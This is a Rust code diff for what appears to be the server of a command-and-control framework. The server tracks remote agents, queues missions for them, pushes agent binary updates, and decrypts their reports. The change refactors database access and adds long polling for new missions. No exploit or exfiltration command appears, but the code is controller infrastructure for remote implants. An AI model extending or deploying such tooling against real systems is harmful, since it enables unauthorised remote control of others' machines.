@@ -49,7 +49,7 @@ async fn get_crypto(
     let agent = match crypto_negociation.verify() {
         Ok(_) => {
             match services::agents::get_by_identity(
-                &c2_state.conn.lock().unwrap(),
+                c2_state.conn.clone(),
                 crypto_negociation.identity.to_bytes(),
             ) {
                 Some(agent) => agent,
@@ -66,7 +66,7 @@ async fn get_crypto(
     };
 
     // Check mission exists
-    let mission = match services::missions::get_by_id(&c2_state.conn.lock().unwrap(), mission_id) {
+    let mission = match services::missions::get_by_id(c2_state.conn.clone(), mission_id) {
         Ok(Some(m)) => m,
         Ok(None) => {
             warn!("Mission not found");
@@ -106,7 +106,7 @@ mod agents {
     use super::*;
 
     pub async fn get(State(c2_state): State<C2State>) -> impl IntoResponse {
-        if let Ok(agents) = services::agents::get(&c2_state.conn.lock().unwrap()) {
+        if let Ok(agents) = services::agents::get(c2_state.conn.clone()) {
             (StatusCode::OK, Json(agents)).into_response()
         } else {
             (StatusCode::INTERNAL_SERVER_ERROR).into_response()
@@ -119,11 +119,11 @@ mod agents {
         Path(agent_id): Path<i32>,
         _bin: Bytes,
     ) -> impl IntoResponse {
-        let mut conn = c2_state.conn.lock().unwrap();
-        if services::agents::get_by_id(&conn, agent_id).is_none() {
+        if services::agents::get_by_id(c2_state.conn.clone(), agent_id).is_none() {
             return (StatusCode::NOT_FOUND).into_response();
         };
-        if let Err(e) = services::missions::create(&mut conn, agent_id, model::Task::Update(vec![]))
+        if let Err(e) =
+            services::missions::create(c2_state.conn.clone(), agent_id, model::Task::Update(vec![]))
         {
             error!("{e}");
             return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
@@ -135,8 +135,9 @@ mod agents {
         State(c2_state): State<C2State>,
         Path((agent_id, agent_name)): Path<(i32, String)>,
     ) -> impl IntoResponse {
-        let conn = c2_state.conn.lock().unwrap();
-        let Ok(agent) = services::agents::update_name_by_id(&conn, agent_id, &agent_name) else {
+        let Ok(agent) =
+            services::agents::update_name_by_id(c2_state.conn.clone(), agent_id, &agent_name)
+        else {
             return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
         };
         (StatusCode::OK, Json(Some(agent))).into_response()
@@ -154,8 +155,8 @@ mod missions {
 
     pub async fn create(State(c2_state): State<C2State>, body: Json<Mission>) -> impl IntoResponse {
         debug!("{body:#?}");
-        let mut conn = c2_state.conn.lock().unwrap();
-        if let Ok(mission) = services::missions::create(&mut conn, body.agent_id, body.task.clone())
+        if let Ok(mission) =
+            services::missions::create(c2_state.conn.clone(), body.agent_id, body.task.clone())
         {
             (StatusCode::CREATED, Json(mission)).into_response()
         } else {
@@ -163,7 +164,6 @@ mod missions {
         }
     }
 
-    // TODO Implement long polling
     pub async fn get_next(
         State(mut c2_state): State<C2State>,
         headers: HeaderMap,
@@ -174,15 +174,14 @@ mod missions {
             return (StatusCode::UNAUTHORIZED).into_response();
         }
 
-        let mut conn = c2_state.conn.lock().unwrap();
-
-        let agent = if let Some(agent) =
-            services::agents::get_by_identity(&conn, crypto_negociation.identity.to_bytes())
-        {
+        let agent = if let Some(agent) = services::agents::get_by_identity(
+            c2_state.conn.clone(),
+            crypto_negociation.identity.to_bytes(),
+        ) {
             agent
         } else {
             match services::agents::create(
-                &conn,
+                c2_state.conn.clone(),
                 "Unnamed agent",
                 crypto_negociation.identity.to_bytes(),
                 headers
@@ -198,51 +197,51 @@ mod missions {
             }
         };
 
-        if let Some(mission) = services::missions::get_next(&mut conn, agent.id) {
-            // TODO Fix that
-            let mission = if let model::Mission {
-                task: model::Task::Update(_),
-                ..
-            } = mission
-            {
-                // let agent_bin =
-                //     std::fs::read("target/x86_64-pc-windows-gnu/release/agent.exe").unwrap();
-                let agent_bin = std::fs::read("target/release/agent").unwrap();
-                model::Mission {
-                    task: model::Task::Update(agent_bin),
-                    ..mission
-                }
-            } else {
-                mission
-            };
-            //
-            debug!("{mission}");
-            let mission = serde_json::to_vec(&mission).unwrap();
-
-            (
-                StatusCode::OK,
-                Json(Some(
-                    model::CryptoMessage::new(
-                        &mut c2_state.signing_key,
-                        crypto_negociation.public_key,
-                        &mission,
-                    )
-                    .unwrap(),
-                )),
-            )
-                .into_response()
-        } else {
+        let Some(mission) = services::missions::poll_next(c2_state.conn.clone(), agent.id).await
+        else {
             debug!("No mission for agent {}", agent.id);
-            (StatusCode::NO_CONTENT).into_response()
-        }
+            return (StatusCode::NO_CONTENT).into_response();
+        };
+
+        // TODO Fix that
+        let mission = if let model::Mission {
+            task: model::Task::Update(_),
+            ..
+        } = mission
+        {
+            // let agent_bin =
+            //     std::fs::read("target/x86_64-pc-windows-gnu/release/agent.exe").unwrap();
+            let agent_bin = std::fs::read("target/release/agent").unwrap();
+            model::Mission {
+                task: model::Task::Update(agent_bin),
+                ..mission
+            }
+        } else {
+            mission
+        };
+        //
+        debug!("{mission}");
+        let mission = serde_json::to_vec(&mission).unwrap();
+
+        (
+            StatusCode::OK,
+            Json(Some(
+                model::CryptoMessage::new(
+                    &mut c2_state.signing_key,
+                    crypto_negociation.public_key,
+                    &mission,
+                )
+                .unwrap(),
+            )),
+        )
+            .into_response()
     }
 
     pub async fn get_report(
         State(c2_state): State<C2State>,
         Path(mission_id): Path<i32>,
     ) -> impl IntoResponse {
-        let conn = c2_state.conn.lock().unwrap();
-        let mission = match services::missions::get_by_id(&conn, mission_id) {
+        let mission = match services::missions::get_by_id(c2_state.conn.clone(), mission_id) {
             Ok(Some(m)) => m,
             Ok(None) => {
                 return (StatusCode::NOT_FOUND, MISSION_NOT_FOUND).into_response();
@@ -265,9 +264,7 @@ mod missions {
         Path(mission_id): Path<i32>,
         crypto_message: Json<model::CryptoMessage>,
     ) -> impl IntoResponse {
-        let mut conn = c2_state.conn.lock().unwrap();
-
-        let mission = match services::missions::get_by_id(&conn, mission_id) {
+        let mission = match services::missions::get_by_id(c2_state.conn.clone(), mission_id) {
             Ok(Some(m)) => m,
             Ok(None) => {
                 return (StatusCode::NOT_FOUND, MISSION_NOT_FOUND).into_response();
@@ -278,7 +275,8 @@ mod missions {
             }
         };
 
-        let Some(agent) = services::agents::get_by_id(&mut conn, mission.agent_id) else {
+        let Some(agent) = services::agents::get_by_id(c2_state.conn.clone(), mission.agent_id)
+        else {
             return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
         };
 
@@ -301,7 +299,7 @@ mod missions {
         let decrypted_data = crypto_message.decrypt(private_key).unwrap();
 
         let result = String::from_utf8(decrypted_data).unwrap();
-        services::missions::complete(&mut conn, mission_id, &result).unwrap();
+        services::missions::complete(c2_state.conn.clone(), mission_id, &result).unwrap();
 
         (StatusCode::ACCEPTED).into_response()
     }
